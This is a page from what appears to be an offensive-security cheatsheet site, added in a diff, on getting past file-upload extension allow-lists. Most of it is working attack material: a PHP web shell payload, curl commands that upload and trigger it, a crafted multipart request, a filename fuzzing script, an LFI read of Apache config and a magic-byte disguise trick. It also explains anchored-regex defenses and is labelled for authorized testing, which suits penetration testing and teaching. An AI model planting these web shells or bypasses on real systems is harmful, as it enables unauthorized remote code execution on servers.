@@ -1,0 +1,231 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Extension whitelist · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › File Upload</nav><h1>Extension whitelist</h1><p class="cx-lede">Bypassing allow-list extension filters - double extensions, reverse double extensions, character injection (null byte, path separators).</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1027</span><span class="cx-tag">D3FEND D3-FA</span><span class="cx-tag">IMPACT RCE, ServerSideEval</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Whitelists are tighter than blacklists but still bypassable when the regex doesn't anchor to end-of-string, or when the server's filename handling differs from the validator's:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Double extension - passes whitelist regex that doesn&#x27;t use $
+shell.jpg.php             # ends with .php, contains .jpg
+shell.png.phtml
+
+# Reverse double extension - exploits Apache misconfig
+shell.php.jpg             # ends with .jpg, contains .php
+shell.phar.jpg            # the operator&#x27;s reliable form
+
+# Character injection - confuses parsing of where the filename actually ends
+shell.php%00.jpg          # null byte - PHP &lt;5.3.4
+shell.php\x00.jpg
+shell.php .jpg            # space (some parsers trim)
+shell.php.jpg.jpg         # double of allowed extension</code></pre></figure>
+<p>Success indicator: file uploads, executes as the dangerous type despite the whitelist.</p>
+<h2 id="why-whitelists-fail">Why whitelists fail</h2>
+<p>A correct whitelist looks like:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">if (!preg_match(&#x27;/^.*\.(jpg|jpeg|png|gif)$/i&#x27;, $fileName)) {
+    echo &quot;Only images allowed&quot;;
+    die();
+}</code></pre></figure>
+<p>The <code>$</code> at the end of the regex anchors to end-of-string. Anything not literally ending with <code>.jpg</code>, <code>.jpeg</code>, <code>.png</code>, <code>.gif</code> is rejected. With this regex, double-extension bypasses fail.</p>
+<p>The vulnerable variants:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php"># Missing $ anchor - checks &quot;contains&quot; instead of &quot;ends with&quot;
+if (!preg_match(&#x27;/^.*\.(jpg|jpeg|png|gif)/i&#x27;, $fileName)) { ... }
+
+# Missing ^ anchor too
+if (!preg_match(&#x27;/\.(jpg|jpeg|png|gif)/i&#x27;, $fileName)) { ... }
+
+# Custom string check
+if (!str_contains($fileName, &quot;.jpg&quot;)) { ... }</code></pre></figure>
+<p>Any of these accept <code>shell.jpg.php</code> - the file contains <code>.jpg</code> somewhere, so it passes.</p>
+<h2 id="double-extension">Double extension</h2>
+<p>The classic whitelist bypass. Append the allowed extension to the dangerous filename:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>shell.jpg.php           # contains .jpg, ends with .php
+shell.png.phtml         # contains .png, ends with .phtml
+shell.gif.phar</code></pre></figure>
+<p>The filename's <em>real</em> extension (as far as the operating system and web server are concerned) is the last one - <code>.php</code>. The whitelist regex looks for <code>.jpg</code> anywhere in the name and finds it, returns "pass." The web server sees <code>.php</code> at the end and treats it as PHP. RCE.</p>
+<h3 id="why-this-works">Why this works</h3>
+<p>Unix filesystems treat <code>.</code> as a regular character - <code>shell.jpg.php</code> is one filename with no special meaning around the dots. Web servers configured to execute <code>.php</code> files match on the <em>last</em> extension. The validator using a loose regex matches the <em>first or any</em> occurrence of the allowed extension.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; shell.jpg.php
+
+# Upload via the application
+curl -F &quot;uploadFile=@shell.jpg.php&quot; https://target/upload.php
+
+# Trigger
+curl &#x27;https://target/uploads/shell.jpg.php?cmd=id&#x27;
+# → uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre></figure>
+<h3 id="when-this-doesnt-work">When this doesn't work</h3>
+<p>When the whitelist regex correctly anchors to end-of-string with <code>$</code>:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">if (!preg_match(&#x27;/^.*\.(jpg|jpeg|png|gif)$/i&#x27;, $fileName)) { ... }</code></pre></figure>
+<p><code>shell.jpg.php</code> ends with <code>.php</code>, not <code>.jpg</code>. The regex correctly rejects. Move to reverse double extension.</p>
+<h2 id="reverse-double-extension">Reverse double extension</h2>
+<p>The variant for cases where the whitelist is strictly anchored but the <em>web server</em> has a permissive PHP handler:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>shell.php.jpg           # ends with .jpg, contains .php
+shell.phar.jpg
+shell.phtml.png</code></pre></figure>
+<p>The whitelist sees <code>.jpg</code> at the end - pass. The web server's PHP handler is configured permissively (Apache regex <code>.+\.ph(p[3457]?|t|tml|ar)</code>), which matches <code>.php</code> anywhere - <code>shell.php.jpg</code> matches because it contains <code>.php</code>. The server runs the file as PHP.</p>
+<h3 id="apache-configuration-that-enables-this">Apache configuration that enables this</h3>
+<p>The misconfiguration is in the Apache PHP handler regex:</p>
+<figure class="cx-code"><figcaption>apache</figcaption><pre><code class="language-apache"># Vulnerable - regex matches .php anywhere in the filename
+&lt;FilesMatch &quot;.+\.ph(p[3457]?|t|tml|ar)&quot;&gt;
+    SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;
+
+# Secure - anchored to end-of-string
+&lt;FilesMatch &quot;\.ph(p[3457]?|t|tml|ar)$&quot;&gt;
+    SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;</code></pre></figure>
+<p>The first version is the actual default on many old Apache configurations. Operators rely on this misconfiguration being more common than it should be.</p>
+<h3 id="exploitation">Exploitation</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; shell.phar.jpg
+
+# Whitelist sees .jpg - pass
+curl -F &quot;uploadFile=@shell.phar.jpg&quot; https://target/upload.php
+
+# Apache PHP handler sees .phar - execute as PHP
+curl &#x27;https://target/uploads/shell.phar.jpg?cmd=id&#x27;
+# → uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre></figure>
+<p>The <code>.phar.jpg</code> form is the operator favorite - <code>.phar</code> is frequently in the Apache PHP handler regex and rarely in the application's extension blacklist.</p>
+<h3 id="when-this-doesnt-work_1">When this doesn't work</h3>
+<ul>
+<li>Modern Apache (2.4+ with default config) - the PHP handler is anchored</li>
+<li>Nginx (different configuration model, doesn't have this regex pattern)</li>
+<li>IIS / ASP.NET (different handler architecture)</li>
+</ul>
+<p>Test by uploading a <code>shell.php.jpg</code> containing <code>&lt;?php echo "OK"; ?&gt;</code> and visiting it. If you see <code>OK</code> in the response, reverse double extension works on the target.</p>
+<h2 id="character-injection">Character injection</h2>
+<p>When neither double extension form works, try injecting characters that confuse the validator about where the filename ends:</p>
+<h3 id="null-byte-00-php-534">Null byte (<code>%00</code>, PHP ≤ 5.3.4)</h3>
+<p>PHP &lt; 5.3.4 treated null bytes as string terminators in filesystem functions:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>shell.php%00.jpg</code></pre></figure>
+<p>The validator sees <code>shell.php\0.jpg</code> - <code>.jpg</code> at the end, passes. PHP's <code>move_uploaded_file()</code> sees <code>shell.php\0.jpg</code>, treats <code>\0</code> as string-end, writes the file as <code>shell.php</code>. RCE.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Workflow
+# The null byte must be in the multipart filename, not in the upload form filename
+# Use Burp to set the multipart filename precisely
+
+# In Burp Repeater:
+# Content-Disposition: form-data; name=&quot;uploadFile&quot;; filename=&quot;shell.php%00.jpg&quot;</code></pre></figure>
+<p>This is dead on modern PHP (every supported version rejects null bytes in filenames). Documented for legacy targets.</p>
+<h3 id="other-characters">Other characters</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>shell.php%20.jpg         # space (URL-encoded) - some parsers trim trailing whitespace
+shell.php%0a.jpg         # newline
+shell.php%0d%0a.jpg      # CR-LF
+shell.php.jpg            # space (literal) - sometimes Apache treats trailing space differently
+shell.php/.jpg           # path separator
+shell.php\.jpg           # backslash
+shell.php..jpg           # double dot
+shell.php.. .jpg
+shell.php.jpg/           # trailing slash</code></pre></figure>
+<p>The principle: any character that the validator doesn't account for, but that the OS or web server treats specially in path resolution.</p>
+<h3 id="windows-specific-separators">Windows-specific separators</h3>
+<p>Windows treats both <code>\</code> and <code>/</code> as path separators. Filenames containing these can confuse upload handling:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>shell.aspx:.jpg          # Windows alternate data stream - writes shell.aspx
+shell.aspx::$DATA        # alternate data stream syntax
+shell.aspx.    .         # trailing dots and spaces - Windows strips them</code></pre></figure>
+<p>The first form (<code>shell.aspx:.jpg</code>) works on Windows web servers - the colon introduces an Alternate Data Stream (ADS), Windows writes the file as <code>shell.aspx</code>, the validator's "contains <code>.jpg</code>" check passes.</p>
+<h3 id="path-traversal-in-filename">Path traversal in filename</h3>
+<p>If the upload writes to disk using the user-supplied filename without sanitization:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>../../shell.php           # writes to parent directory
+../../../var/www/html/x.php   # writes anywhere</code></pre></figure>
+<p>This is a separate vulnerability class - the upload writes to attacker-chosen locations. When it works, it doesn't even need execution-context tricks because the operator chooses where the file lands (likely a directory the web server treats as executable).</p>
+<h2 id="generating-filename-permutations">Generating filename permutations</h2>
+<p>For systematic fuzzing, generate every combination:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">cat &gt; /tmp/upload-perms.sh &lt;&lt;&#x27;EOF&#x27;
+#!/bin/bash
+INJECTED=(&#x27;%20&#x27; &#x27;%0a&#x27; &#x27;%00&#x27; &#x27;%0d%0a&#x27; &#x27;/&#x27; &#x27;\\&#x27; &#x27;.&#x27; &#x27;..&#x27; &#x27;...&#x27; &#x27;:&#x27;)
+EXTS=(&#x27;.php&#x27; &#x27;.phps&#x27; &#x27;.phar&#x27; &#x27;.phtml&#x27; &#x27;.pht&#x27;)
+ALLOWED=(&#x27;.jpg&#x27; &#x27;.png&#x27; &#x27;.gif&#x27;)
+
+for char in &quot;${INJECTED[@]}&quot;; do
+    for ext in &quot;${EXTS[@]}&quot;; do
+        for allowed in &quot;${ALLOWED[@]}&quot;; do
+            echo &quot;shell${char}${ext}${allowed}&quot;
+            echo &quot;shell${ext}${char}${allowed}&quot;
+            echo &quot;shell${allowed}${char}${ext}&quot;
+            echo &quot;shell${allowed}${ext}${char}&quot;
+        done
+    done
+done
+EOF
+chmod +x /tmp/upload-perms.sh
+/tmp/upload-perms.sh &gt; /tmp/upload-fuzzlist.txt</code></pre></figure>
+<p>Feed this to Burp Intruder, targeting the <code>filename</code> portion of the multipart upload. Sort responses by size to find ones that didn't get the standard "extension not allowed" message.</p>
+<h2 id="apache-handler-discovery">Apache handler discovery</h2>
+<p>To know whether reverse double extension will work, identify what extensions the server's PHP handler executes:</p>
+<h3 id="via-php-filter-if-lfi-is-available">Via PHP filter (if LFI is available)</h3>
+<p>Read the PHP handler configuration:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>?page=php://filter/convert.base64-encode/resource=/etc/apache2/mods-enabled/php7.4.conf</code></pre></figure>
+<p>Look for the <code>FilesMatch</code> directive - the regex tells you which extensions execute.</p>
+<h3 id="via-uploaded-test-files">Via uploaded test files</h3>
+<p>When LFI isn't available, test by uploading and observing:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Upload one test file per candidate extension chain
+for ext in phar.jpg php.jpg phtml.jpg pht.jpg php5.jpg; do
+    echo &quot;&lt;?php echo \&quot;OK_$ext\&quot;; ?&gt;&quot; &gt; &quot;test.$ext&quot;
+    curl -F &quot;uploadFile=@test.$ext&quot; https://target/upload.php
+    rm &quot;test.$ext&quot;
+done
+
+# Then visit each
+for ext in phar.jpg php.jpg phtml.jpg pht.jpg php5.jpg; do
+    echo &quot;=== test.$ext ===&quot;
+    curl &quot;https://target/uploads/test.$ext&quot;
+done</code></pre></figure>
+<p>Any response containing <code>OK_&lt;ext&gt;</code> indicates that extension executes as PHP. Use that extension for the actual exploit.</p>
+<h2 id="worked-example-strict-whitelist-apache-misconfig">Worked example - strict whitelist + Apache misconfig</h2>
+<p>A typical hardened-but-vulnerable target:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">// Server-side validation
+if (!preg_match(&#x27;/^.*\.(jpg|jpeg|png|gif)$/i&#x27;, $fileName)) {
+    echo &quot;Only image extensions allowed&quot;;
+    die();
+}
+
+// Also checks Content-Type
+if (!in_array($contentType, [&#x27;image/jpeg&#x27;, &#x27;image/png&#x27;, &#x27;image/gif&#x27;])) {
+    echo &quot;Only images allowed&quot;;
+    die();
+}</code></pre></figure>
+<p>The whitelist is properly anchored - <code>shell.jpg.php</code> fails. But the Apache config has the loose PHP handler regex.</p>
+<p>Bypass: <code>shell.phar.jpg</code> with <code>Content-Type: image/jpeg</code>:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /upload.php HTTP/1.1
+Host: target.example.com
+Content-Type: multipart/form-data; boundary=---X
+
+-----X
+Content-Disposition: form-data; name=&quot;uploadFile&quot;; filename=&quot;shell.phar.jpg&quot;
+Content-Type: image/jpeg
+
+&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;
+-----X--</code></pre></figure>
+<p>The whitelist sees <code>.jpg</code> ending - pass. The Content-Type check sees <code>image/jpeg</code> - pass. Apache sees <code>.phar</code> somewhere in the filename - executes as PHP.</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">curl &#x27;https://target/uploads/shell.phar.jpg?cmd=id&#x27;
+# → uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre></figure>
+<p>For a target that also validates magic bytes, prepend <code>GIF8</code>:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>GIF8&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;</code></pre></figure>
+<p>Now the file's first bytes look like a GIF. MIME-sniffing validators see "GIF image"; Apache still executes the PHP because the extension is <code>.phar</code>. See <a href="../content-type-bypass/index.html">Content-Type bypass</a> for the full content-validation treatment.</p>
+<h2 id="detection-only-payloads">Detection-only payloads</h2>
+<p>A non-destructive probe to determine which extension types execute:</p>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash"># Build the test files
+for combo in &quot;shell.jpg.php&quot; &quot;shell.php.jpg&quot; &quot;shell.phar.jpg&quot; &quot;shell.png.phtml&quot;; do
+    echo &quot;&lt;?php echo \&quot;EXEC_$combo\&quot;; ?&gt;&quot; &gt; &quot;$combo&quot;
+done
+
+# Upload each (use the application&#x27;s normal upload flow, with bypasses if needed)
+# ...
+
+# Visit each and look for the marker
+for combo in &quot;shell.jpg.php&quot; &quot;shell.php.jpg&quot; &quot;shell.phar.jpg&quot; &quot;shell.png.phtml&quot;; do
+    echo &quot;=== $combo ===&quot;
+    curl -s &quot;https://target/uploads/$combo&quot; | grep &quot;EXEC_$combo&quot;
+done</code></pre></figure>
+<p>A hit on any of these confirms execution and identifies which form works.</p>
+<h2 id="notes">Notes</h2>
+<ul>
+<li><strong>Double extension fails on properly anchored regexes.</strong> When the whitelist uses <code>$</code> correctly, only the <em>last</em> extension matters and <code>.jpg.php</code> fails. Move to reverse double extension or character injection.</li>
+<li><strong>Reverse double extension depends on Apache config.</strong> Modern Apache (default config since 2.4) has the PHP handler properly anchored - reverse double extension fails. Older deployments and custom configurations are still vulnerable at high rates.</li>
+<li><strong>Character injection is mostly legacy.</strong> Null-byte injection died with PHP 5.3.4. The other character tricks (spaces, alternate separators) work in narrow circumstances. Don't rely on them as a first move.</li>
+<li><strong>The strongest defense is layered.</strong> A well-defended app uses anchored whitelist + anchored PHP handler + content-type check + magic-byte check. Each layer has its own bypass, but stacking the bypasses gets harder. When you encounter a target where none of these work, the upload may genuinely be locked down - pivot to other attack surfaces.</li>
+</ul>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>The single most reliable extension whitelist bypass: <code>shell.phar.jpg</code> with PHP content and <code>image/jpeg</code> Content-Type. Works against properly-anchored whitelists when combined with the common Apache PHP handler misconfiguration. If this fails, the application is genuinely well-defended at the extension layer and content validation is probably also in play.</p>
+</div></article><nav class="cx-pager"><a class="cx-prev" href="../extension-blacklist/index.html">Previous: Extension blacklist</a><a class="cx-next" href="../content-type-bypass/index.html">Next: Content-Type bypass</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
